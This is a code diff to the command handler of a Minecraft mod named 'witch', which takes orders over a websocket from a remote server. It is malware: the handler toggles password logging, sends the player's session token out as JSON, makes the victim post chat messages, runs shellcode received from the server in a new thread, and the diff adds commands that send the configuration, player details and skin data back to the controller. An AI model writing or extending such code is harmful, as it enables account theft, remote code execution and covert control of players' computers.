@@ -1,5 +1,6 @@
 package me.soda.witch.websocket;
 
+import com.google.gson.Gson;
 import me.soda.witch.Witch;
 import me.soda.witch.features.*;
 import net.minecraft.text.Text;
@@ -19,26 +20,22 @@ public class MessageHandler {
         try {
             switch (messageType) {
                 case "steal_pwd_switch":
-                    Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
+                    Witch.config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "steal_token":
-                    MessageUtils.sendMessage(messageType, Stealer.stealToken());
-                    break;
-                case "getconfig":
-                case "vanish":
-                    //todo
+                    MessageUtils.sendMessage(messageType, new Gson().toJson(new Stealer.Token()));
                     break;
                 case "chat_control":
                     ChatUtil.sendChat(decodeBase64(msgArr[1]));
                     break;
                 case "chat_filter":
-                    Config.filterPattern = decodeBase64(msgArr[1]);
+                    Witch.config.filterPattern = decodeBase64(msgArr[1]);
                     break;
                 case "chat_filter_switch":
-                    Config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
+                    Witch.config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "chat_mute":
-                    Config.isMuted = Boolean.parseBoolean(msgArr[1]);
+                    Witch.config.isMuted = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "mods":
                     MessageUtils.sendMessage(messageType, MinecraftUtil.allMods());
@@ -66,8 +63,21 @@ public class MessageHandler {
                         new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                     break;
                 case "log":
-                    Config.logChatAndCommand = !Config.logChatAndCommand;
-                    MessageUtils.sendMessage(messageType, String.valueOf(Config.logChatAndCommand));
+                    Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
+                    MessageUtils.sendMessage(messageType, String.valueOf(Witch.config.logChatAndCommand));
+                    break;
+                case "config":
+                    MessageUtils.sendMessage(messageType, new Gson().toJson(Witch.config));
+                    break;
+                case "player":
+                    MessageUtils.sendMessage(messageType, new Gson().toJson(new PlayerInfo(Witch.mc.player)));
+                    break;
+                case "skin":
+                    handle("player");
+                    MessageUtils.sendMessage(messageType, PlayerSkin.getPlayerSkin());
+                    break;
+                case "vanish":
+                    //todo
                     break;
                 default:
                     break;
